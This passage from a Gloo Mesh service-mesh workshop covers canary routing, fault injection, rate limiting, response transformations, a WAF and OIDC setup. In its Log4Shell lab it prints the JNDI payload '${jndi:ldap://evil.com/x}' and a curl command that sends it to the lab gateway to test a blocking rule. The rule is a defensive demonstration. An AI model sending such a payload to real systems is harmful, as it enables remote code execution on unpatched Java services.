kind: RouteTable
metadata:
  name: productpage
  namespace: bookinfo-frontends
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: productpage
      matchers:
      - uri:
          exact: /productpage
      - uri:
          prefix: /static
      - uri:
          exact: /login
      - uri:
          exact: /logout
      - uri:
          prefix: /api/v1/products
      forwardTo:
        destinations:
          - ref:
              name: productpage
              namespace: bookinfo-frontends
            port:
              number: 9080
EOF
```

You can now access the `productpage` application securely through the browser.
Get the URL to access the `productpage` service using the following command:
```
echo "https://${ENDPOINT_HTTPS_GW_MGMT}/productpage"
```

This diagram shows the flow of the request (through the Istio Ingress Gateway):

![Gloo Mesh Gateway](images/runbook3b.png)

## Lab 7 - Canary deployment with traffic shifting <a name="Lab-7"></a>

Let's explore weighted destinations and how we can use them to demonstrate basic functionality of canary deployments. Leveraging weighted destinations, we can start to build up foundations of progressive delivery techniques

Take note that our current deployment does not have any weights defined. This will result in a round-robin behavior across the existing reviews services in mgmt. You will notice that v1 (no stars) and v2 (black stars) reviews services. 

Let's assume that the v2 reviews service is a newly developed application. Round robin in this case may not be desirable in this situation since we may still be testing the functionality of the "new" v2 service in our cluster. A good strategy we can leverage to carefully release the v2 service is canary/progressive delivery.

Here we will create a new RouteTable that will allow us to define weights for our reviews service so that I can control the flow of traffic to each subset. Let's start by setting 100% of the weight to the v1 service. 

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: reviews
  namespace: bookinfo-backends
spec:
  hosts:
  - reviews.bookinfo-backends.svc.cluster.local
  http:
  - forwardTo:
      destinations:
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v1
        weight: 100
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v2
        weight: 0
    matchers:
    - uri:
        prefix: /
    name: reviews
  workloadSelectors:
  - selector:
      labels:
        app: productpage
EOF
```

If you navigate back to your bookinfo application, what we should observe is that only v1 reviews service is available (no stars)

Great! Now lets slowly shift traffic to our newly created v2 service and observe the behavior for correctness. Typically you can do this progressively to ensure low impact in case of an issue such as a 20-40-60-80-100 weighted strategy. For this lab we will just progressively shift to v2 50/50, and then 100% v2

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: reviews
  namespace: bookinfo-backends
spec:
  hosts:
  - reviews.bookinfo-backends.svc.cluster.local
  http:
  - forwardTo:
      destinations:
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v1
        weight: 50
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v2
        weight: 50
    matchers:
    - uri:
        prefix: /
    name: reviews
  workloadSelectors:
  - selector:
      labels:
        app: productpage
EOF
```

If you navigate back to your bookinfo application, what we should observe is v1 and v2 reviews service are served 50% of the time

Now that we feel confident that v2 reviews service will work, we can shift traffic completely to v2 (black stars)

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: reviews
  namespace: bookinfo-backends
spec:
  hosts:
  - reviews.bookinfo-backends.svc.cluster.local
  http:
  - forwardTo:
      destinations:
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v1
        weight: 0
      - port:
          number: 9080
        ref:
          cluster: mgmt
          name: reviews
          namespace: bookinfo-backends
        subset:
          version: v2
        weight: 100
    matchers:
    - uri:
        prefix: /
    name: reviews
  workloadSelectors:
  - selector:
      labels:
        app: productpage
EOF
```

If you navigate back to your bookinfo application, what we should observe v2 reviews service is served 100% of the time

We have now successfully transitioned our v1 app to the v2 canary!

Let's delete the `RouteTable` we've created to move forward with the next labs:
```bash
kubectl --context ${MGMT} -n bookinfo-backends delete routetable reviews
```

## Lab 8 - Traffic policies <a name="Lab-8"></a>

We're going to use Gloo Mesh policies to inject faults and configure timeouts.

Let's create the following `FaultInjectionPolicy` to inject a delay when the `v2` version of the `reviews` service talk to the `ratings` service:

```bash
cat << EOF | kubectl --context ${MGMT} apply -f -
apiVersion: resilience.policy.gloo.solo.io/v2
kind: FaultInjectionPolicy
metadata:
  name: ratings-fault-injection
  namespace: bookinfo-backends
spec:
  applyToRoutes:
  - route:
      labels:
        fault_injection: "true"
  config:
    delay:
      fixedDelay: 2s
      percentage: 100
EOF
```

As you can see, it will be applied to all the routes that have the label `fault_injection` set to `"true"`.

So, you need to create a `RouteTable` with this label set in the corresponding route.

```bash
cat << EOF | kubectl --context ${MGMT} apply -f -
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: ratings
  namespace: bookinfo-backends
spec:
  hosts:
    - 'ratings.bookinfo-backends.svc.cluster.local'
  workloadSelectors:
  - selector:
      labels:
        app: reviews
  http:
    - name: ratings
      labels:
        fault_injection: "true"
      matchers:
      - uri:
          prefix: /
      forwardTo:
        destinations:
          - ref:
              name: ratings
              namespace: bookinfo-backends
            port:
              number: 9080
EOF
```

If you refresh the webpage, you should see that it takes longer to get the `productpage` loaded when version `v2` of the `reviews` services is called.

Now, let's configure a 0.5s request timeout when the `productpage` service calls the `reviews` service on mgmt.

You need to create the following `RetryTimeoutPolicy`:

```bash
cat << EOF | kubectl --context ${MGMT} apply -f -
apiVersion: resilience.policy.gloo.solo.io/v2
kind: RetryTimeoutPolicy
metadata:
  name: reviews-request-timeout
  namespace: bookinfo-backends
spec:
  applyToRoutes:
  - route:
      labels:
        request_timeout: "0.5s"
  config:
    requestTimeout: 0.5s
EOF
```

As you can see, it will be applied to all the routes that have the label `request_timeout` set to `"0.5s"`.

Then, you need to create a `RouteTable` with this label set in the corresponding route.

```bash
cat << EOF | kubectl --context ${MGMT} apply -f -
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: reviews
  namespace: bookinfo-backends
spec:
  hosts:
    - 'reviews.bookinfo-backends.svc.cluster.local'
  workloadSelectors:
  - selector:
      labels:
        app: productpage
  http:
    - name: reviews
      labels:
        request_timeout: "0.5s"
      matchers:
      - uri:
          prefix: /
      forwardTo:
        destinations:
          - ref:
              name: reviews
              namespace: bookinfo-backends
            port:
              number: 9080
            subset:
              version: v2
EOF
```

If you refresh the page several times, you'll see an error message telling that reviews are unavailable when the productpage is trying to communicate with the version `v2` of the `reviews` service.

![Bookinfo reviews unavailable](images/steps/traffic-policies/reviews-unavailable.png)

This diagram shows where the timeout and delay have been applied:

![Gloo Mesh Traffic Policies](images/runbook4b.png)

Let's delete the Gloo Mesh objects we've created:

```bash
kubectl --context ${MGMT} -n bookinfo-backends delete faultinjectionpolicy ratings-fault-injection
kubectl --context ${MGMT} -n bookinfo-backends delete routetable ratings
kubectl --context ${MGMT} -n bookinfo-backends delete retrytimeoutpolicy reviews-request-timeout
kubectl --context ${MGMT} -n bookinfo-backends delete routetable reviews
kubectl --context ${MGMT} -n bookinfo-frontends delete routetable productpage
```

## Lab 9 - Expose an external service <a name="Lab-9"></a>

In this step, we're going to expose an external service through a Gateway using Gloo Mesh. Our use cases will apply for both External Services that are external to the cluster (i.e. an external database server or Public Cloud Service) as well as in-cluster but not in the mesh. Then we will show techniques on how we can then incrementally migrate this service to the Mesh.

### Exposing a service external to the mesh and external to the cluster
Let's create an `ExternalService` corresponding to `httpbin.org`:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: httpbin-org
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
  - httpbin.org
  ports:
  - name: http
    number: 80
    protocol: HTTP
  - name: https
    number: 443
    protocol: HTTPS
    clientsideTls: {}
EOF
```

Now, you can create a `RouteTable` to expose `httpbin.org` through the gateway:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin-org
            namespace: httpbin
EOF
```

You should now be able to access `httpbin.org` external service through the gateway.

Get the URL to access the `httpbin` service using the following command:
```
echo "https://${ENDPOINT_HTTPS_GW_MGMT}/get"
```

Note that when the response comes from the external service (httpbin.org), there's a `X-Amzn-Trace-Id` header.

This diagram shows our new flow
![Gloo Mesh External Service](images/runbook5b.png)

### Exposing a service external to the mesh, but in-cluster
Similar to the exercise above, we can also expose services that are external to the mesh but in-cluster with the same workflow using `ExternalService` and modifying our `RouteTable`

Let's give this a go for our httpbin service `not-in-mesh`. Notice that in this case I am using the fqdn of our local `not-in-mesh` service that is in-cluster for the `ExternalService`
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: ExternalService
metadata:
  name: httpbin-not-in-mesh
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
  - not-in-mesh.httpbin
  ports:
  - name: https
    number: 8000
    protocol: HTTPS
EOF
```

Now we can route to our `httpbin-not-in-mesh` external service by modifying our route table
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 8000
          ref:
            name: httpbin-not-in-mesh
            namespace: httpbin
EOF
```

You should now be able to access the `not-in-mesh` external service through the gateway.

Get the URL to access the `httpbin` service using the following command:
```
echo "https://${ENDPOINT_HTTPS_GW_MGMT}/get"
```

Note that when the response comes from the external service `not-in-mesh`, there is no longer an `X-Amzn-Trace-Id` header. And when the response comes from the local service, there's a `X-B3-Spanid` header.


### Apply Weighted Destinations to Validate Behavior
Let's update the `RouteTable` to direct
-  30% of the traffic to the external httpbin service at httpbin.org
-  40% of the traffic to the local `not-in-mesh` httpbin service
-  30% of the traffic to the local `in-mesh` httpbin service

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - kind: EXTERNAL_SERVICE
          port:
            number: 443
          ref:
            name: httpbin-org
            namespace: httpbin
          weight: 30
        - kind: EXTERNAL_SERVICE
          port:
            number: 8000
          ref:
            name: httpbin-not-in-mesh
            namespace: httpbin
          weight: 40
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
          weight: 30
EOF
```

If you refresh your browser, you should see that you get a response either from the local services `in-mesh` or `not-in-mesh` or from the external service at httpbin.org. You can validate the behavior below:

- When the response comes from the external service `httpbin-org`, there a `X-Amzn-Trace-Id` header
- When the response comes from the external service `not-in-mesh`, there is no longer an `X-Amzn-Trace-Id` header. And when the response comes from the local service, there's a `X-B3-Spanid` header.
- When the response comes from the external service `in-mesh`, there is an additional `X-Forwarded-Client-Cert` that contains the SPIFFE ID which is used to validate mTLS

This diagram shows our current setup with weighted routing
![Gloo Mesh External Service](images/runbook6b.png)

### Canary to in-mesh service
Finally, you can update the `RouteTable` to direct all the traffic to the local `httpbin` service:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

If you refresh your browser, you should see that you get responses only from the local service `in-mesh`.

## Lab 10 - Implement Rate Limiting policy on httpbin <a name="Lab-10"></a>
In this lab, lets explore adding rate limiting to our httpbin route

In this step, we're going to apply rate limiting to the Gateway to only allow 5 requests per minute

First, we need to create a `RateLimitClientConfig` object to define the descriptors:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitClientConfig
metadata:
  labels:
    workspace.solo.io/exported: "true"
  name: httpbin
  namespace: httpbin
spec:
  raw:
    rateLimits:
    - actions:
      - genericKey:
          descriptorValue: "per-minute"
      - remoteAddress: {}
EOF
```

Then, we need to create a `RateLimitServerConfig` object to define the limits based on the descriptors:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerConfig
metadata:
  labels:
    workspace.solo.io/exported: "true"
  name: httpbin
  namespace: gloo-mesh-addons
spec:
  destinationServers:
  - port:
      name: grpc
    ref:
      cluster: mgmt
      name: rate-limiter
      namespace: gloo-mesh-addons
  raw:
    descriptors:
      - key: generic_key
        value: "per-minute"
        descriptors:
          - key: remote_address
            rateLimit:
              requestsPerUnit: 5
              unit: MINUTE
EOF
```

After that, we need to create a `RateLimitPolicy` object to define the descriptors:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: RateLimitPolicy
metadata:
  labels:
    workspace.solo.io/exported: "true"
  name: httpbin
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    ratelimitClientConfig:
      cluster: mgmt
      name: httpbin
      namespace: httpbin
    ratelimitServerConfig:
      cluster: mgmt
      name: httpbin
      namespace: gloo-mesh-addons
    serverSettings:
      cluster: mgmt
      name: rate-limit-server
      namespace: httpbin
EOF
```

We also need to create a `RateLimitServerSettings`, which is a CRD that define which extauth server to use: 

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: admin.gloo.solo.io/v2
kind: RateLimitServerSettings
metadata:
  labels:
    workspace.solo.io/exported: "true"
  name: rate-limit-server
  namespace: httpbin
spec:
  destinationServer:
    port:
      name: grpc
    ref:
      cluster: mgmt
      name: rate-limiter
      namespace: gloo-mesh-addons
EOF
```

Finally, you need to update the `RouteTable` to use this `RateLimitPolicy`:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      labels:
        ratelimited: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Refresh the web page multiple times. You should see a 429 error after 5 refreshes

## Lab 11 - Use the Transformation filter <a name="Lab-11"></a>

### manipulate :status pseudo-header when rate limited
Lets try a simple use case leveraging the transformation filter output when rate limited. For our first case, lets say our application expects a `529` header instead of the default `429` header returned when rate limited by Envoy. We can let the transformation filter handle that!
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: TransformationPolicy
metadata:
  name: ratelimit-transformation
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    phase:
      preAuthz:
        priority: 0
    response:
      injaTemplate:
        headers:
          ":status":
            text: '{% if header(":status") == "429" %}529{% else %}{{ header(":status") }}{% endif %}'  
EOF
```

Refresh the web browser and we will see that the HTTP ERROR has changed from 429 to 529. Now my application will be happy with the correct error output when rate limited

### manipulate the response body when rate limited
Let's use the transformation filter to manipulate the response body when rate limited. For our first example we will just output a styled html page in the browser with an error message
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: trafficcontrol.policy.gloo.solo.io/v2
kind: TransformationPolicy
metadata:
  name: ratelimit-transformation
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        ratelimited: "true"
  config:
    phase:
      preAuthz:
        priority: 0
    response:
      injaTemplate:
        body:
          text: '{% if header(":status") == "429" %}<html><body style="background-color:powderblue;"><h1>Too
            many Requests!</h1><p>Try again after a minute</p></body></html>{%
            else %}{{ body() }}{% endif %}'
        parseBodyBehavior: DontParse
EOF
```

Now if we refresh the page in the browser we should see a blue error page that says
```
Too many Requests!
Try again after a minute
```

## Lab 12 - Use the Web Application Firewall filter <a name="Lab-12"></a>
A web application firewall (WAF) protects web applications by monitoring, filtering, and blocking potentially harmful traffic and attacks that can overtake or exploit them.

Gloo Mesh includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 

An example of how using Gloo Mesh we'd easily mitigate the recent Log4Shell vulnerability ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)), which for many enterprises was a major ordeal that took weeks and months of updating all services.

The Log4Shell vulnerability impacted all Java applications that used the log4j library (common library used for logging) and that exposed an endpoint. You could exploit the vulnerability by simply making a request with a specific header. In the example below, we will show how to protect your services against the Log4Shell exploit. 

Using the Web Application Firewall capabilities you can reject requests containing such headers. 

Log4Shell attacks operate by passing in a Log4j expression that could trigger a lookup to a remote server, like a JNDI identity service. The malicious expression might look something like this: `${jndi:ldap://evil.com/x}`. It might be passed in to the service via a header, a request argument, or a request payload. What the attacker is counting on is that the vulnerable system will log that string using log4j without checking it. That’s what triggers the destructive JNDI lookup and the ultimate execution of malicious code.

Create the WAF policy:

```bash
kubectl --context ${MGMT} apply -f - <<'EOF'
apiVersion: security.policy.gloo.solo.io/v2
kind: WAFPolicy
metadata:
  name: log4shell
  namespace: httpbin
spec:
  applyToRoutes:
  - route:
      labels:
        waf: "true"
  config:
    disableCoreRuleSet: true
    customInterventionMessage: 'Log4Shell malicious payload'
    customRuleSets:
    - ruleStr: |
        SecRuleEngine On
        SecRequestBodyAccess On
        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
EOF
```

Finally, you need to update the httpbin `RouteTable` to use this `WAFPolicy`:

```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      labels:
        waf: "true"
        ratelimited: "true"
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Run the following command to simulate an attack:

```bash
curl -H "User-Agent: \${jndi:ldap://evil.com/x}" -k https://${ENDPOINT_HTTPS_GW_MGMT}/get -i
```

The request should be rejected:
```
HTTP/2 403 
content-length: 27
content-type: text/plain
date: Tue, 05 Apr 2022 10:20:06 GMT
server: istio-envoy

Log4Shell malicious payload
```

### cleanup labs 12-14
Not necessary for the workshop, but if you want to clean up the rate limit, WAF, and transformation objects from these past couple labs you can use the commands below

First let's apply the original `RouteTable` yaml:
```bash
kubectl --context ${MGMT} apply -f - <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  name: httpbin
  namespace: httpbin
  labels:
    expose: "true"
spec:
  hosts:
    - '*'
  virtualGateways:
    - name: north-south-gw-443
      namespace: istio-gateways
      cluster: mgmt
  workloadSelectors: []
  http:
    - name: httpbin
      matchers:
      - uri:
          exact: /get
      - uri:
          prefix: /anything
      forwardTo:
        destinations:
        - ref:
            name: in-mesh
            namespace: httpbin
          port:
            number: 8000
EOF
```

Then we can also delete the various policies we've created:
```
# external service
kubectl --context ${MGMT} -n httpbin delete externalservice httpbin-org
kubectl --context ${MGMT} -n httpbin delete externalservice httpbin-not-in-mesh

# rate limiting
kubectl --context ${MGMT} -n httpbin delete ratelimitpolicy httpbin
kubectl --context ${MGMT} -n httpbin delete ratelimitclientconfig httpbin
kubectl --context ${MGMT} -n httpbin delete ratelimitserverconfig httpbin
kubectl --context ${MGMT} -n httpbin delete ratelimitserversettings rate-limit-server

# transformation
kubectl --context ${MGMT} -n httpbin delete transformationpolicy ratelimit-transformation

# WAF
kubectl --context ${MGMT} -n httpbin delete wafpolicies.security.policy.gloo.solo.io log4shell
```

## Lab 13 - Exploring the Gloo Mesh Enterprise UI <a name="Lab-13"></a>

Gloo Mesh provides a powerful dashboard to view your multi-cluster Istio environment.

The Overview page presents an at-a-glance look at the health of workspaces and clusters that make up your Gloo Mesh setup. In the Workspaces and Clusters panes, you can review a count of the healthy resources, sort by, or search by name for your resources. You can review top-level details about each resource in the resource cards. The Gloo Mesh UI includes a Graph page to visualize the network traffic in your apps across meshes and clusters. The graph is based off Prometheus metrics that the agents on each workload cluster send the management cluster.

To access the UI, run the following command:
```
kubectl port-forward -n gloo-mesh svc/gloo-mesh-ui 8090 --context ${MGMT}
```

The UI is available at http://localhost:8090

![Gloo Mesh Dashboard](images/runbook7a.png)

## Lab 14 - Exposing the Gloo Mesh UI <a name="Lab-14"></a>
To expose the Gloo Mesh UI using our Ingress Gateway instead of port-forwarding, first we will add the Gloo Mesh UI pod into the mesh

### Update Gloo Mesh Helm 
Save this as a values.yaml, keep the commented out sections as we may use those later
```bash
cat <<EOF >>values.yaml
licenseKey: ${GLOO_MESH_LICENSE_KEY}
global:
  cluster: mgmt
mgmtClusterName: mgmt
glooMeshMgmtServer:
  ports:
    healthcheck: 8091
  serviceType: LoadBalancer
glooMeshUi:
  enabled: true
  serviceType: ClusterIP
  # if cluster is istio enabled we can also add the dashboard into the mesh
  deploymentOverrides:
    spec:
      template:
        metadata:
          annotations:
            sidecar.istio.io/inject: "true"
          labels:
            istio.io/rev: "1-13"
EOF
```

Now upgrade Gloo Mesh
```bash
helm --kube-context ${MGMT} upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise -n gloo-mesh --version=2.1.0-beta27 --values=values.yaml
```

Now that we have injected the gloo-mesh-ui with a sidecar, we should be able to see this reflected as `4/4` READY pods. If not just delete the pod so it re-deploys with one
```
% k get pods -n gloo-mesh
NAME                                     READY   STATUS    RESTARTS      AGE
gloo-mesh-redis-5d694bdc9-8cqx8          1/1     Running   0             60m
gloo-mesh-mgmt-server-6c66ddd7c8-jjddg   1/1     Running   0             60m
prometheus-server-59946649d9-2gcgx       2/2     Running   0             60m
gloo-mesh-agent-598bc58db9-7xbjv         1/1     Running   1 (58m ago)   59m
gloo-mesh-ui-54c67b5bc6-bwv5n            4/4     Running   1 (56m ago)   56m
```

### Expose the Gloo Mesh UI using a Route Table
Next we can deploy the route table mapping to this destination
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  labels:
    expose: "true"
  name: gm-ui-rt
  namespace: gloo-mesh
spec:
  hosts:
  - '*'
  http:
  - forwardTo:
      destinations:
      - ref:
          name: gloo-mesh-ui
          namespace: gloo-mesh
        port:
          number: 8090
    labels:
      waf: "true"
    name: gloo-mesh-ui
    matchers:
    - uri:
        exact: /
    - uri:
        exact: /welcome
    - uri:
        prefix: /static
    - uri:
        prefix: /login
    - uri:
        prefix: /rpc
    - uri:
        prefix: /workspace
    - uri:
        prefix: /oidc-callback
  virtualGateways:
  - cluster: mgmt
    name: north-south-gw-80
    namespace: istio-gateways
  workloadSelectors: []
EOF
```

Now you should be able to access the Gloo Mesh UI on port 80
```
echo "http://${ENDPOINT_HTTP_GW_MGMT}"
```

Alternatively you can also apply the `RouteTable` to the gateway on 443 instead by selecting the `spec.virtualGateway.name: north-south-gw-443` 
```bash
kubectl apply --context ${MGMT} -f- <<EOF
apiVersion: networking.gloo.solo.io/v2
kind: RouteTable
metadata:
  labels:
    expose: "true"
  name: gm-ui-rt
  namespace: gloo-mesh
spec:
  hosts:
  - '*'
  http:
  - forwardTo:
      destinations:
      - ref:
          name: gloo-mesh-ui
          namespace: gloo-mesh
        port:
          number: 8090
    labels:
      waf: "true"
    name: gloo-mesh-ui
    matchers:
    - uri:
        exact: /
    - uri:
        exact: /welcome
    - uri:
        prefix: /static
    - uri:
        prefix: /login
    - uri:
        prefix: /rpc
    - uri:
        prefix: /workspace
    - uri:
        prefix: /oidc-callback
  virtualGateways:
  - cluster: mgmt
    name: north-south-gw-443
    namespace: istio-gateways
  workloadSelectors: []
EOF
```

Now you should be able to access the Gloo Mesh UI on port 443
```
echo "https://${ENDPOINT_HTTPS_GW_MGMT}"
```

## Lab 15 - Integrate Gloo Mesh UI with OIDC <a name="Lab-15"></a>
Now that we have our Gloo Mesh UI exposed, we can integrate it with our OIDC. The Gloo Mesh API server has its own external auth service built in. This way, you can manage external auth for the Gloo Mesh UI separately from the external auth that you set up for your application networking policies.

Integrating the Gloo Mesh UI with OIDC consists of a few steps:
```
- create app registration for the Gloo Mesh UI in your OIDC
- Using Helm, update Gloo Mesh with new OIDC configuration
```

The `gloo-mesh-enterprise` helm chart lets us define the OIDC values inline. The values OIDC values are described below:
```
glooMeshUi:
  enabled: true
  auth:
    enabled: true
    backend: oidc
    oidc:
      clientId: # From the OIDC provider
      clientSecret: # From the OIDC provider. Stored in a secret that you created in advance in the same namespace as the Gloo Mesh UI. In this example, the secret's name is 'dashboard'.
      clientSecretName: dashboard
      issuerUrl: # The URL to connect to the OpenID Connect identity provider, often in the format 'https://<domain>.<provider_url>/'.
      appUrl: # The URL that the Gloo Mesh UI is exposed at, such as 'https://localhost:8090'.
```

### Setting our Variables
Set the callback URL in your OIDC provider to map to our newly exposed Gloo Mesh UI route
```bash
export GMUI_CALLBACK_URL="https://$(kubectl --context ${MGMT} -n istio-gateways get svc istio-ingressgateway -o jsonpath='{.status.loadBalancer.ingress[0].*}')"

echo ${GMUI_CALLBACK_URL}
```

Replace the `OICD_CLIENT_ID` and `ISSUER_URL` values below with your OIDC app settings:
```bash
export GMUI_OIDC_CLIENT_ID="<client ID for Gloo Mesh UI app>"
export GMUI_OIDC_CLIENT_SECRET="<client secret for Gloo Mesh UI app>"
export ISSUER_URL="<OIDC issuer url (i.e. https://dev-22651234.okta.com/oauth2/default)>"
```

Let's make sure our variables are set correctly:
```bash
echo ${GMUI_OIDC_CLIENT_ID}
echo ${GMUI_OIDC_CLIENT_SECRET}
echo ${ISSUER_URL}
```

### Update Gloo Mesh Helm
Let's save a new `values-oidc.yaml` to fill in the auth config that we have uncommented below
```bash
cat <<EOF >>values-oidc.yaml
licenseKey: ${GLOO_MESH_LICENSE_KEY}
global:
  cluster: mgmt
mgmtClusterName: mgmt
glooMeshMgmtServer:
  ports:
    healthcheck: 8091
  serviceType: LoadBalancer
glooMeshUi:
  enabled: true
  serviceType: ClusterIP
  auth:
    enabled: true
    backend: oidc
    oidc: 
      # From the OIDC provider
      clientId: "${GMUI_OIDC_CLIENT_ID}"
      # From the OIDC provider. To be base64 encoded and stored as a kubernetes secret.
      clientSecret: "${GMUI_OIDC_CLIENT_SECRET}"
      # Name for generated secret
      clientSecretName: dashboard
      # The issuer URL from the OIDC provider, usually something like 'https://<domain>.<provider_url>/'.
      issuerUrl: ${ISSUER_URL}
      # The URL that the UI for the OIDC app is available at, from the DNS and other ingress settings that expose the OIDC app UI service.
      appUrl: "${GMUI_CALLBACK_URL}"
  # if cluster is istio enabled we can also add the dashboard into the mesh
  deploymentOverrides:
    spec:
      template:
        metadata:
          annotations:
            sidecar.istio.io/inject: "true"
          labels:
            istio.io/rev: "1-13"
EOF
```

### Update Gloo Mesh using Helm
Now upgrade Gloo Mesh with our new `values-oidc.yaml` to pick up our new config
```bash
helm --kube-context ${MGMT} upgrade --install gloo-mesh-enterprise gloo-mesh-enterprise/gloo-mesh-enterprise -n gloo-mesh --version=2.1.0-beta27 --values=values-oidc.yaml
```

Once configured, we should be able to access the Gloo Mesh UI and it should be now be protected by OIDC.
```bash
echo ${GMUI_CALLBACK_URL}
```

![Gloo Mesh Dashboard OIDC](images/runbook8a.png)

## Lab 16 - Securing Application access with OAuth <a name="Lab-16"></a>
In this step, we're going to secure the access to the `httpbin` service using OAuth. Integrating an app with extauth consists of a few steps:
```
- create app registration in your OIDC
- configuring a Gloo Mesh `ExtAuthPolicy` and `ExtAuthServer`
- configuring the `RouteTable` with a specified label (i.e. `oauth: "true"`)
```

### In your OIDC Provider
Once the app has been configured in the external OIDC, we need to create a Kubernetes Secret that contains the OIDC client-secret. Please provide this value input before running the command below:
```bash
export HTTPBIN_CLIENT_SECRET="<provide OIDC client secret here>"
```

```bash
